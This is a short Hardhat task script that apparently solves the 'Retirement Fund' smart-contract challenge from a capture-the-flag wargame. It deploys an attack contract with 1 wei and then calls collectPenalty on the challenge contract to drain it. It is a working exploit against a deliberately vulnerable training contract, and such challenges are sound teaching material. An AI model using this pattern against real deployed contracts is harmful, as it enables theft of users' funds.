import { task } from "hardhat/config";

const contractAddress = "0xb7810a4E52E8e0Aee24caE64998d2c03EB061c93";

task("retirement-fund", "Solves the 'Retirement Fund' challenge", async (_taskArgs, hre) => {
  const challengeFactory = await hre.ethers.getContractFactory("RetirementFundChallenge");
  const challengeContract = challengeFactory.attach(contractAddress);

  const attackFactory = await hre.ethers.getContractFactory("RetirementFundAttack");
  await attackFactory.deploy(contractAddress, { value: 1 });

  const tx = await challengeContract.collectPenalty();
  await tx.wait();
});
